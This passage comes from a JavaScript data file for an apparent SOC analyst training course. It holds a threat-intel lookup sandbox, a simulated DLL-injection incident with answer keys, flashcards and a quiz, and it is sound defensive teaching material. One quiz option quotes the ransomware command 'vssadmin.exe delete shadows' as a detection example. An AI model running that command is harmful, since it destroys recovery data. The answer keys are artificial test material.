            commandOrId: 'Pass-the-Hash / Kerberoasting',
            riskOrUsage: 'Behavioral detection rules in SIEM/EDR; forces adversary retraining.',
            severity: 'Critical'
          }
        ]
      },
      sandboxType: 'threat-intel',
      sandboxConfig: {
        title: 'Threat Intelligence Lookup & Hash Validator Engine',
        instructions: 'Query simulated hashes, IPs, and domains against enterprise Threat Intelligence feeds. Inspect VirusTotal-style detection ratios, behavioral tags, and sandbox artifacts.',
        defaultData: {
          intelDatabase: [
            {
              indicator: '8a3e7b2f4c9102bd5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d',
              type: 'SHA256',
              classification: 'Malicious',
              detectionRatio: '68/72',
              threatFamily: 'CobaltStrike.Stager',
              tags: ['c2-client', 'process-injection', 'signed-stolen-cert'],
              summary: 'Known Cobalt Strike malleable C2 payload configured for encrypted HTTPS beaconing.'
            },
            {
              indicator: '198.51.100.88',
              type: 'IP',
              classification: 'Suspicious',
              detectionRatio: '14/90',
              threatFamily: 'Bulletproof Hosting / Tor Exit',
              tags: ['scanner', 'ssh-brute-force', 'fast-flux'],
              summary: 'Associated with automated mass port scanning and dictionary attacks targeting Port 22.'
            },
            {
              indicator: 'login-verify-account.bank-portal-security.com',
              type: 'Domain',
              classification: 'Malicious',
              detectionRatio: '45/88',
              threatFamily: 'PhishKit.Office365',
              tags: ['credential-harvesting', 'lookalike-domain', 'nrd-age-1-day'],
              summary: 'Credential harvesting page spoofing corporate Single Sign-On portal.'
            }
          ]
        }
      },
      incident: {
        id: 'inc-3088',
        ticketNumber: 'SEC-3088',
        title: 'Suspicious DLL Loaded in System32 with High Entropy and Unknown SHA-256',
        severity: 'High',
        affectedAsset: 'SRV-PRINT-02 (10.0.8.44)',
        timestamp: '2026-10-03 21:30:00 UTC',
        summary: 'Sysmon Event ID 7 (Image Loaded) alerted on unsigned DLL `spoolsv_helper.dll` loaded by `spoolsv.exe`. File hash has 0 detections on VirusTotal, but static analysis indicates high Shannon entropy (7.91) and calls to `VirtualAllocEx`.',
        rawTelemetry: [
          '2026-10-03T21:28:10Z Sysmon EventID=7 ImageLoaded=C:\\Windows\\System32\\spoolsv_helper.dll ImagePath=C:\\Windows\\System32\\spoolsv.exe Signed=false Hashes=SHA256=d4e5f6a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9',
          'Static Strings extraction: "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "198.51.100.120:8443"',
          'VirusTotal API lookup result: First Seen=2026-10-03 21:25:00 UTC (10 mins ago), Detections=0/72 (Zero-Day / Custom Compiler)'
        ],
        triageOptions: {
          correctClassification: 'True Positive',
          explanation: 'Even with 0 detections on VirusTotal (newly compiled malware), behavioral indicators (unsigned DLL in System32, high entropy, process injection APIs) confirm a true positive zero-day threat.'
        },
        rootCauseOptions: {
          options: [
            'Adversary dropped custom-compiled zero-day DLL in System32 attempting DLL side-loading or process injection under the Print Spooler service.',
            'Microsoft official cumulative security update updating printer drivers.',
            'Canon manufacturer official signed printer diagnostic software.',
            'Temporary log file created during PDF print job.'
          ],
          correctIndex: 0,
          explanation: 'The presence of process injection API imports (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`) and hardcoded C2 socket inside an unsigned DLL proves malicious payload injection.'
        },
        containmentOptions: {
          options: [
            'Isolate SRV-PRINT-02 immediately, acquire volatile RAM and the raw DLL file for sandboxing, terminate the spoolsv process, and block C2 IP 198.51.100.120 across all firewalls.',
            'Ignore the alert because VirusTotal shows 0 detections.',
            'Wait until VirusTotal updates tomorrow before taking action.',
            'Whitelist the DLL to prevent print service interruptions.'
          ],
          correctIndex: 0,
          explanation: 'Never rely on 0/72 VirusTotal score for freshly compiled payloads; act immediately on behavioral indicators, isolate the host, acquire the sample, and block network IOCs.'
        },
        mitreTechniques: [
          'T1574.002 - Hijack Execution Flow: DLL Side-Loading',
          'T1055.001 - Process Injection: Dynamic-link Library Injection'
        ],
        slaMinutes: 30
      },
      flashcards: [
        {
          id: 'fc-3-7',
          question: 'Explain David Bianco\'s "Pyramid of Pain" and why Hashes are at the bottom while TTPs are at the top.',
          category: 'Threat Intelligence',
          difficulty: 'Junior',
          modelAnswer: 'The Pyramid of Pain illustrates how difficult it is for an adversary to overcome defensive controls when defenders block indicators at each level. At the bottom are Hash Values, which are Trivial for attackers to change simply by altering a byte of code or recompiling. As you move up through IP addresses (Easy), Domain names (Simple), Network/Host artifacts (Annoying), and Tools (Challenging), the cost to the attacker increases. At the top are TTPs (Tactics, Techniques, and Procedures), which are Tough for an attacker to replace because modifying their fundamental operational behavior requires retraining and rebuilding their entire offensive capability.',
          scoringTips: ['List the 6 tiers in order.', 'Explain that hashes are trivial to change.', 'Explain why TTPs impose maximum cost on attackers.'],
          corporateContext: 'A quintessential interview question to test the candidate\'s strategic understanding of cyber defense.'
        },
        {
          id: 'fc-3-8',
          question: 'What is the difference between an Indicator of Compromise (IOC) and an Indicator of Attack (IOA)?',
          category: 'Threat Hunting',
          difficulty: 'Mid',
          modelAnswer: 'An Indicator of Compromise (IOC) is a reactive forensic artifact that proves an attack has ALREADY occurred in the past (e.g. a specific malware SHA-256 hash, a known malicious C2 IP address, or a specific registry key). An Indicator of Attack (IOA) is a proactive, behavior-based detection that identifies active malicious intent and execution AS IT HAPPENS, regardless of the malware or hash used (e.g. a process attempting code injection into LSASS, disabling security logging, or deleting volume shadow copies).',
          scoringTips: ['IOC = reactive, historical artifact (hash, IP).', 'IOA = proactive, behavioral intent in real-time.', 'Give real examples of each (hash vs memory injection).'],
          corporateContext: 'Tests if the analyst understands behavioral endpoint detection (CrowdStrike/Defender) vs legacy antivirus.'
        },
        {
          id: 'fc-3-9',
          question: 'Why should a SOC analyst never rely solely on a 0/72 detection score on VirusTotal to declare a file clean?',
          category: 'Malware Analysis',
          difficulty: 'Mid',
          modelAnswer: 'A 0/72 score on VirusTotal simply means that none of the 72 antivirus engines have previously seen or written a signature for that specific cryptographic hash. Sophisticated adversaries, APTs, and targeted ransomware operators compile fresh, unique binaries for specific victims or use custom obfuscators/packers. If an analyst dismisses a file based solely on a 0/72 score, they will miss zero-day intrusions. Analysts must evaluate behavioral telemetry, process lineage, code signing status, entropy, and import tables.',
          scoringTips: ['Explain that 0/72 only reflects static signature databases.', 'Mention targeted, custom-compiled malware and zero-days.', 'Emphasize behavioral analysis over hash reputation.'],
          corporateContext: 'Vital operational lesson that prevents catastrophic false-negative closures in the SOC.'
        }
      ],
      quiz: [
        {
          id: 'q-3-7',
          question: 'At which level of the Pyramid of Pain does blocking an adversary cause the LEAST disruption to their operation?',
          options: ['Tools', 'TTPs', 'Hash Values', 'Network Artifacts'],
          correctIndex: 2,
          explanation: 'Hash Values are at the bottom of the pyramid (Trivial) because an attacker can alter the hash in seconds by modifying a comment, recompiling, or using a packer.'
        },
        {
          id: 'q-3-8',
          question: 'What does a high Shannon Entropy value (e.g. > 7.5 out of 8.0) in an executable binary strongly suggest to a malware analyst?',
          options: [
            'The file contains high-resolution video games.',
            'The file is likely encrypted, packed, or compressed to evade static string analysis.',
            'The file was created on a macOS computer.',
            'The file has been approved by Microsoft Quality Control.'
          ],
          correctIndex: 1,
          explanation: 'High entropy indicates randomness. In executables, high entropy almost always signifies that the code is packed or encrypted to hide malicious strings and API imports from static scanners.'
        },
        {
          id: 'q-3-9',
          question: 'Which of the following is the best example of an Indicator of Attack (IOA) rather than an Indicator of Compromise (IOC)?',
          options: [
            'File MD5 hash `5d41402abc4b2a76b9719d911017c592`',
            'IP address `198.51.100.25`',
            'A suspicious process spawning `vssadmin.exe delete shadows` followed by rapid disk write spikes',
            'Domain name `bad-malware-domain.com`'
          ],
          correctIndex: 2,
          explanation: 'Shadow copy deletion followed by rapid mass file encryption is a behavioral pattern (IOA) that signals ransomware activity in progress, regardless of what file or hash executes it.'
        }
      ]
    }
  ]
};
